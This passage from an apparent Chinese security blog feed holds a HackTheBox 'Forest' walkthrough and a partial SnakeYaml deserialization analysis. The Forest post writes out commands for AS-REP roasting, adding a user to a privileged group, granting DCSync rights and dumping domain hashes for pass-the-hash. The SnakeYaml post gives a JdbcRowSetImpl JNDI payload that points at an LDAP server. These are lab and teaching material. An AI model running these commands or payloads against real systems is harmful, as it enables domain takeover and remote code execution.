&lt;p&gt;因为开启了smb服务，这里先尝试用&lt;code&gt;smbclient&lt;/code&gt;裸连一下，发现虽然可以匿名登录，但什么共享都没有列出来。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Forest/Pasted%20image%2020230914174910.png&quot; alt=&quot;&quot; /&gt;
然后再尝试用ms17010来打一下，发现还是一无所获，暂时来看&lt;code&gt;SMB&lt;/code&gt;这条道路是走不通了，但ldap服务我们还没有试过，可以对其进行一下简单的尝试。首先用&lt;code&gt;ldapsearch&lt;/code&gt;做了一下匿名访问，&lt;code&gt;ldapsearch -H ldap://10.10.10.161:389 -x -b &quot;dc=htb,dc=local&quot;&lt;/code&gt;。最终是从茫茫人海中嫖到了 &lt;code&gt;svc-alfresco&lt;/code&gt;这个用户 (其实就是对着wp怼的)，我自己做的时候更喜欢&lt;code&gt;Activity Directory Studio&lt;/code&gt;这种可视化的界面，ldap链接上去之后也是同理的。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Forest/Pasted%20image%2020230914104636.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Forest/Pasted%20image%2020230914104320.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;简单的找GPT要了要&lt;code&gt;aflresco&lt;/code&gt;的资料&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Forest/Pasted%20image%2020230914105713.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;用&lt;code&gt;Impacket&lt;/code&gt;下的&lt;code&gt;GetNPUsere.py&lt;/code&gt;查了查关闭了&lt;code&gt;Kerberos身份预验证机制&lt;/code&gt;的用户（就能直接返回TGT票据的那种），这里是直接就返回了我们刚才说的&lt;code&gt;svc-alerso&lt;/code&gt;用户，下方的字符串则是经过用户的&lt;code&gt;NTLM Hash&lt;/code&gt;加密的TGT票据，我们可以尝试用 &lt;code&gt;john&lt;/code&gt; 来破解一下密码。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Forest/Pasted%20image%2020230914112651.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;照着wp做的，成功破解密码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Forest/Pasted%20image%2020230914113605.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;这里顺便再复习一下Kerberous协议的知识，图一是原始的TGT票据，图二是经过处理后发给TGS的TGT票据&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Forest/TGT1.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Forest/TGT2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;这里我们破译的TGT票据是第一种，就AS发给我们的那种。而想要让AS发给我们TGT，我们就必须先把身份信息(如下)，发给AS，经过检验后才会为我们颁发TGT，我们将此流程称之为Kerberous的身份预验证机制&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Forest/Pasted%20image%2020230914163103.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;但偶尔也有例外，并不是每一个账户都必须得经过这个身份预验证机制。在一些配置不当的情况下，账户会关闭身份预验证选项。在这种情况下，我们就可以用&lt;code&gt;GetNPUsere.py&lt;/code&gt;查TGT票据，就和上面的情况一样。&lt;/p&gt;
&lt;p&gt;然后就是这里除了从ldap获取users以外，我们还可以尝试用&lt;code&gt;rpcclient&lt;/code&gt;来获取用户，命令如下
rpcclient调用的是SMB服务里面的MS-RPC功能，当smbclient没什么效果的时候我们可以试一试用rpcclient来连SMB服务（这块后面补上的，一开始以为&lt;code&gt;smb&lt;/code&gt;的路已经彻底堵住了）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;rpcclient -U &quot;&quot; -N 10.10.10.161
enumdomusers
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Forest/Pasted%20image%2020230914173719.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行完之后把username拷到txt文件里，这样拿TGT会稳妥一点，之前那种做法不大好，纯看默认字典强度&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python3 GetNPUsers.py htb.local/ -usersfile /root/hackthebox/Forest/uname.txt -dc-ip 10.10.10.161
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;解释完之后咱们接着往下做，把&lt;code&gt;SharpBlood.exe&lt;/code&gt;用&lt;code&gt;evil-winrm&lt;/code&gt;传上去，之后再配合&lt;code&gt;BloudHood&lt;/code&gt;来搜集信息查找攻击路径，这里是选择&lt;code&gt;The shortest path to Domain Admin&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Forest/Pasted%20image%2020230915145018.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Forest/Pasted%20image%2020230915145941.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;发现了这么一条比较合理的路径，因为&lt;code&gt;SVC-FRESCO&lt;/code&gt;用户属于&lt;code&gt;ACCOUNT OPERATORS&lt;/code&gt;组，而&lt;code&gt;ACCOUNT OPERATORS&lt;/code&gt;组对&lt;code&gt;EXCHANGE WINDOWS PERMISSION&lt;/code&gt;组有&lt;code&gt;GenericAll&lt;/code&gt;权限，所以我们可以通过&lt;code&gt;SVC-FRESCO&lt;/code&gt;对&lt;code&gt;EXCHANGE WINDOWS PERMISSION&lt;/code&gt;创建一个高权限用户（就和之前&lt;code&gt;Support&lt;/code&gt;里创建万能委派账号是一个样的）, 而又因为&lt;code&gt;EXCHANGE WINDOWS PERMISSION&lt;/code&gt;对&lt;code&gt;HTB.LOCAL&lt;/code&gt;拥有&lt;code&gt;WriteDacl&lt;/code&gt;权限，我们显然可以通过刚才所创建的高权限用户修改&lt;code&gt;HTB.LOCAL&lt;/code&gt;的&lt;code&gt;DAcl&lt;/code&gt; ，以此来赋予刚才创建的高权限账户对域内更高的权限（这里是赋予了Dsync权限，来导出域内用户的hash），稍微总结一下我们的攻击路径。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用&lt;code&gt;SVC-ALFERSCO&lt;/code&gt;的&lt;code&gt;GenericAll&lt;/code&gt;权限，给&lt;code&gt;EXCHANGE&lt;/code&gt;组创建一个高权限傀儡账号（后文称其为&lt;code&gt;test888&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;用&lt;code&gt;test888&lt;/code&gt;账号修改域内&lt;code&gt;DACL&lt;/code&gt;列表的功能，给&lt;code&gt;test888&lt;/code&gt;账号自己加上对域内的&lt;code&gt;Dsync&lt;/code&gt;权限&lt;/li&gt;
&lt;li&gt;通过&lt;code&gt;Dsync&lt;/code&gt;权限导出域内所有用户的hash&lt;/li&gt;
&lt;li&gt;利用&lt;code&gt;wmiexec&lt;/code&gt;进行&lt;code&gt;PTH&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;先按流程给&lt;code&gt;EXCHANGE&lt;/code&gt;组创建一个高权限傀儡账号&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;net user test888 test123! /add /domain
net group &quot;Exchange Windows Permissions&quot; test888 /add
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Forest/Pasted%20image%2020230915153152.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$SecPassword = ConvertTo-SecureString &apos;test123!&apos; -AsPlain -Force
//使用 PowerShell 语言中的 ConvertTo-SecureString cmdlet 来创建一个安全字符串对象，将明文密码转换为安全的密码。
$Cred = New-Object System.Management.Automation.PSCredential(&apos;htb\test888&apos;, $SecPassword)
//New-Object 创建了一个名为 $Cred 的对象，这个对象是 //System.Management.Automation.PSCredential 类型的凭据对象,该凭据对象通常用于存储用户名和密码，以便在 PowerShell 脚本中进行身份验证或与其他系统进行安全通信。
upload PowerView.ps1
//上传PowerView脚本
Import-Module .\PowerView.ps1
//导入功能
Add-DomainObjectAcl -PrincipalIdentity test888 -Credential $Cred -Rights DCSync
//增添DCSync权限
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Forest/Pasted%20image%2020230915154347.png&quot; alt=&quot;&quot; /&gt;
赋完权限之后用&lt;code&gt;secretsdump.py&lt;/code&gt;登录账户导出域内has即可
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Forest/Pasted%20image%2020230915175407.png&quot; alt=&quot;&quot; /&gt;
拿到了域控管理员的NTLM Hash,用&lt;code&gt;wmiexec.py&lt;/code&gt;进行PTH传递
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Forest/Pasted%20image%2020230915180211.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/articles/network/286137.html&quot;&gt;内网渗透测试：DCSync 攻击技术的利用 - FreeBuf网络安全行业门户&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;pwn!
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Forest/Pasted%20image%2020230915180053.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>SnakeYaml反序列化简析</title><link>https://f4miti0n.github.io/posts/snakeyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E6%9E%90/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/snakeyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E6%9E%90/</guid><pubDate>Tue, 19 Sep 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;原理什么的，都还算比较简单，其中一部分可以归类到任意setter/getter调用这一块&lt;/p&gt;
&lt;h3&gt;环境准备&lt;/h3&gt;
&lt;p&gt;java环境是jdk8u66的
&lt;code&gt;pom.xml&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;  
&amp;lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;  
         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  
         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&amp;gt;  
    &amp;lt;modelVersion&amp;gt;4.0.0&amp;lt;/modelVersion&amp;gt;  
    &amp;lt;groupId&amp;gt;org.example&amp;lt;/groupId&amp;gt;  
    &amp;lt;artifactId&amp;gt;com&amp;lt;/artifactId&amp;gt;  
    &amp;lt;version&amp;gt;1.0-SNAPSHOT&amp;lt;/version&amp;gt;  
    &amp;lt;properties&amp;gt;        
    &amp;lt;maven.compiler.source&amp;gt;8&amp;lt;/maven.compiler.source&amp;gt;  
        &amp;lt;maven.compiler.target&amp;gt;8&amp;lt;/maven.compiler.target&amp;gt;  
        &amp;lt;project.build.sourceEncoding&amp;gt;UTF-8&amp;lt;/project.build.sourceEncoding&amp;gt;  
    &amp;lt;/properties&amp;gt;
    &amp;lt;dependencies&amp;gt;
        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;org.yaml&amp;lt;/groupId&amp;gt;  
            &amp;lt;artifactId&amp;gt;snakeyaml&amp;lt;/artifactId&amp;gt;  
            &amp;lt;version&amp;gt;1.27&amp;lt;/version&amp;gt;  
        &amp;lt;/dependency&amp;gt;
    &amp;lt;/dependencies&amp;gt;  
&amp;lt;/project&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;简单测试&lt;/h3&gt;
&lt;h4&gt;对于getter调用的验证&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;public class SnakeYamlTest {  
    public static void main(String[] args) {  
    //序列化
        Yaml yaml = new Yaml();  
        Person person = new Person(&quot;mike&quot;, 18);  
        String str = yaml.dump(person);  
        System.out.println(str);  
    }  
}
----------------------------------------------------------------------------
public class Person {  
    private String username;  
    private int age;  
    public Person() {}  
    public Person(String username, int age) {  
        this.username = username;  
        this.age = age;  
    }  
    public int getAge() {  
        System.out.println(&quot;getAge&quot;);  
        return age;  
    }  
    public String getUsername() {  
        System.out.println(&quot;getUsername&quot;);  
        return username;  
    }  
    public void setAge(int age) {  
        this.age = age;  
    }  
    public void setUsername(String username) {  
        this.username = username;  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行结果如下
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918115804.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4&gt;对于setter调用的验证&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;public class SnakeYamlTest {
    public static void main(String[] args) {
        // 反序列化
        String str = &quot;!!SnakeYaml.Person {age: 18, username: mike}&quot;;
        Yaml yaml = new Yaml();
        Person person = (Person) yaml.load(str);
        System.out.println(person);
    }
}
---------------------------------------------------------------------------
public class Person {  
    private String username;  
    private int age;  
    public Person() {}  
    public Person(String username, int age) {  
        this.username = username;  
        this.age = age;  
    }  
    public int getAge() {  
        System.out.println(&quot;getAge&quot;);  
        return age;  
    }  
    public String getUsername() {  
        System.out.println(&quot;getUsername&quot;);  
        return username;  
    }  
    public void setAge(int age) {  
        System.out.println(&quot;setAge&quot;);  
        this.age = age;  
    }  
    public void setUsername(String username) {  
        System.out.println(&quot;setUsername&quot;);  
        this.username = username;  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行结果如下
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918120004.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;调试分析&lt;/h3&gt;
&lt;h4&gt;JdbcRowSetImpl链&lt;/h4&gt;
&lt;p&gt;在本地起个ldap服务，这里是得到了可利用地址: &lt;code&gt;ldap://127.0.0.1:1389/prb171&lt;/code&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918120616.png&quot; alt=&quot;&quot; /&gt;
之后开始着手分析，用到的测试类如下，我们在yaml.load下个断点开始分析&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;package org.example;  
import org.example.pojo.Person;  
import org.yaml.snakeyaml.Yaml;  
public class SnakeYamlTest {  
    public static void main(String[] args) {  
        String poc = &quot;!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: ldap://127.0.0.1:1389/prb171, autoCommit: true}&quot;;  
        Yaml yaml = new Yaml();  
        yaml.load(poc);  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918121200.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;跟进一下发现是一些重载，我们盲跟两步，在&lt;code&gt;loadFromRead&lt;/code&gt;中的289行打个断点，之后的流程以这里为起点跟进&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918121441.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918121847.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;getSingleData&lt;/code&gt;的源码如下，简单分析一下，这块是先从我们所传入字节流中读取单个节点，之后再对该节点进行一系列判断，先判断当前节点是否为空，再判断当前节点是否为Java对象，最后再判断当前节点是否为根节点。不过这里面只有第一个判断是比较关键的，剩下两个判断不影响我们走到113行把节点转换成Java对象这里，我们跟进一下113行。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918122215.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;越过重载跟进到一个挺长的三目表达式这里，判断的对象是&lt;code&gt;this.constructObject&lt;/code&gt;。这个对象简单地介绍一下，这是&lt;code&gt;SnakeYaml&lt;/code&gt;为已加载过的对象所设的存储表，这块相当于是在进行一个缓存判断，因为表中没有我们本次要加载的对象，我们这里跟&lt;code&gt;this.constructObjectNoCheck(node)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918125452.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918125726.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;跟进之后，这里会先判断当前节点是否为自递归节点，如果不是的话就把当前节点加入&lt;code&gt;this.recuresiveObjects&lt;/code&gt;里，然后再进行一个缓存判断，如果&lt;code&gt;constructedObjects&lt;/code&gt;属性中存在与当前节点对应的Java对象，则返回该对象。如果不存在，则调用&lt;code&gt;constructor.construct&lt;/code&gt;方法构造Java对象，我们这里是跟到了&lt;code&gt;constructor.construct()&lt;/code&gt;这里。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918165854.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;跟进一下之后发现是个重载，根据&lt;code&gt;node&lt;/code&gt;的类型来指派构造器，这里是指派到了&lt;code&gt;ConstrucMapping&lt;/code&gt;类型的，我们跟进一下它的&lt;code&gt;construct&lt;/code&gt;方法。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918170319.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918170719.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;在该方法里，会先将当前节点类型强转为&lt;code&gt;MappingNode&lt;/code&gt;，之后再判断该节点的父类是否为&lt;code&gt;Map&lt;/code&gt;，&lt;code&gt;Collection&lt;/code&gt;中的任意一种。因为这里都不是，我们最终使用刚才获得到&lt;code&gt;Constructor.this.newInstance()&lt;/code&gt;来实例化我们的&lt;code&gt;JdbcRowSetImpl&lt;/code&gt;对象，而在474行则再会对我们的node进行判断，判断这个节点的实例化是否是那种可以一次完成的类型，如果确实是，则直接返回刚才生成的对象，如果不是，则用&lt;code&gt;this.constructJavaBean2ndStep()&lt;/code&gt;进行第二次构造，我们这里还得再跟一下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918171133.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;我们的终点在这个506行起头的&lt;code&gt;try&lt;/code&gt;结构上，在这里面，他会有一个反射调用属性的set方法的过程。490行这里会对node下面的子节点进行constructedObjects的
遍历展开，分析起来有点麻烦，咱们就不详细跟进了，直接往后走流程。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918174641.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918182918.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918183044.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$i&lt;/code&gt; 是长这个样的，这里先从&lt;code&gt;keynode&lt;/code&gt;中获得&lt;code&gt;key&lt;/code&gt;，再根据&lt;code&gt;key&lt;/code&gt;的名称获得属性对象，之后如法炮制获得&lt;code&gt;value&lt;/code&gt;，最终在经过一系列判断之后，再&lt;code&gt;property.set()&lt;/code&gt;中经过反射实现set方法的调用，到此为止&lt;code&gt;SnakeYaml&lt;/code&gt;部分的东西就算结束了，我们再象征性的往后分析一下&lt;code&gt;JdbcRowSetImpl&lt;/code&gt;链的部分。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918184211.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918183725.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918184604.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;第一个&lt;code&gt;property&lt;/code&gt;是&lt;code&gt;dataSource&lt;/code&gt;，跳过一堆反射步骤，最终调用的是&lt;code&gt;setDataSourceName&lt;/code&gt;，最终通过父类的&lt;code&gt;setDataSourceName()&lt;/code&gt;方法，把&lt;code&gt;DataSource&lt;/code&gt;的值给安排妥当了。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918185712.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918185928.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;第二个&lt;code&gt;property&lt;/code&gt;是&lt;code&gt;autoCommit&lt;/code&gt;，最终调用的方法是&lt;code&gt;setAutoCommit&lt;/code&gt; 。&lt;code&gt;setAutoCommit&lt;/code&gt;这个方法里最关键的地方在于4067行调用&lt;code&gt;connect()&lt;/code&gt;这块，我们跟进一下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918190149.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918190300.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;一点进来就能发现&lt;code&gt;try&lt;/code&gt; 结构里面躺着的 &lt;code&gt;lookup&lt;/code&gt;调用点，到此整条链子也就收工了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918190710.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918190932.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4&gt;ScriptEngineManager链&lt;/h4&gt;
&lt;h5&gt;SPI机制&lt;/h5&gt;
&lt;p&gt;当服务的提供者提供了一种接口的实现之后，需要在 classpath 下的 META-INF/services/ 目录里创建一个以服务接口命名的文件，这个文件里的内容就是这个接口的具体实现类。当其他程序需要这个服务的时候，就会找到接口文件里面的实现类并且将之实例化，因为这里的实现类可能不只有一个，所以我们经过加载得到的往往是一个迭代器。&lt;/p&gt;
&lt;p&gt;比如在加载&lt;code&gt;mysql-connector-java-8.0.27.jar&lt;/code&gt;的时候，会自动找到其下目录的&lt;code&gt;META-INF/service&lt;/code&gt;文件夹的文件，之后再根据文件中所记载的类名进行类加载，也是这个机制的原因，我们不用手动加载驱动（老版本就得手动加载），直接获取连接即可。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230919163715.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;在我们的JDK 中，这里查找服务的实现的工具类是 &lt;code&gt;java.util.ServiceLoader&lt;/code&gt;，一个基本的SPI机制使用的Demo如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// 定义服务接口
public interface MyService {
    void doSomething();
}

// 创建服务提供者的实现类
public class MyServiceImpl1 implements MyService {
    @Override
    public void doSomething() {
        System.out.println(&quot;Implementation 1 does something.&quot;);
    }
}

public class MyServiceImpl2 implements MyService {
    @Override
    public void doSomething() {
        System.out.println(&quot;Implementation 2 does something.&quot;);
    }
}

// 在 META-INF/services/ 目录下创建文件 com.example.MyService
// 文件内容：
// com.example.MyServiceImpl1
// com.example.MyServiceImpl2

// 使用ServiceLoader加载服务
public class ServiceLoaderExample {
    public static void main(String[] args) {
        ServiceLoader&amp;lt;MyService&amp;gt; serviceLoader = ServiceLoader.load(MyService.class);
        // 使用ServiceLoader加载MyService接口的实现类
        for (MyService service : serviceLoader) {
            service.doSomething();
            //调用实现类的方法
        }
    }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;h5&gt;流程分析&lt;/h5&gt;
&lt;p&gt;前面的流程和&lt;code&gt;JdbcRowSetImpl&lt;/code&gt;链差不了太多，顶多是&lt;code&gt;constructor&lt;/code&gt;这里会有些许不一样，我们这里从&lt;code&gt;construct&lt;/code&gt;这里开始跟就可以了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230919164508.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230919164438.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;先瞅瞅node的结构是怎么样的，然后再来分析源码。能够看出来，这里是根据value的大小，设置了一个可能会起到作用的构造器数组，之后又根据当前node本身设置了一个构造器数组，总共两个，一个针对value里的部分，一个针对当前的&lt;code&gt;ScriptEngineManager&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230919165225.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230919165536.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;之后把重心放到我标断点的地方，能够看到这里会先将当前node的value大小和当前node的&lt;code&gt;constructor&lt;/code&gt;的参数类型个数做比较，如果相等，则将当前的&lt;code&gt;constrcutor&lt;/code&gt;放到&lt;code&gt;possibleconstructor&lt;/code&gt;数组里。在以147行为起点的代码段会对&lt;code&gt;snode&lt;/code&gt;进行遍历，用&lt;code&gt;constructObject&lt;/code&gt;以递归的形式实例化出&lt;code&gt;snode&lt;/code&gt;里面的参数。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230919173401.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
